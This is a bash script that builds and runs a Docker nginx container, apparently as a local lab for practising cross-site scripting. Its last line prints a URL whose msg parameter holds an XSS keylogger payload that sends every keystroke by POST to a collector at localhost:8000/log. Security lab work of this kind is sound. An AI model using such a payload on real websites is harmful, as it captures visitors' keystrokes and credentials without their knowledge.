#!/bin/bash

IMAGE="xss-nginx"
CONTAINER="xss-nginx-cyber"

# mapping the port where we'll open in our broswer e.g.
HOST_PORT=6969
CONTAINER_PORT=80

if [ "$(docker ps -a -q -f name=${CONTAINER})" ]; then
	echo ">>> Deleting previous created container: ${CONTAINER}"
	docker rm -f ${CONTAINER}
fi

echo "<<< Building Docker image!"
docker build --no-cache -t ${IMAGE} .

echo "<<< Running Docker container!"
docker run -d \
	-p ${HOST_PORT}:${CONTAINER_PORT} \
	--name ${CONTAINER} ${IMAGE}

echo ">>> Access to container: http://localhost:${HOST_PORT}"
echo ">>>> If you prefer to access with the XXS: http://localhost:${HOST_PORT}/?msg=document.addEventListener('keydown',function(e){fetch('http://localhost:8000/log',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key:e.key})});});"
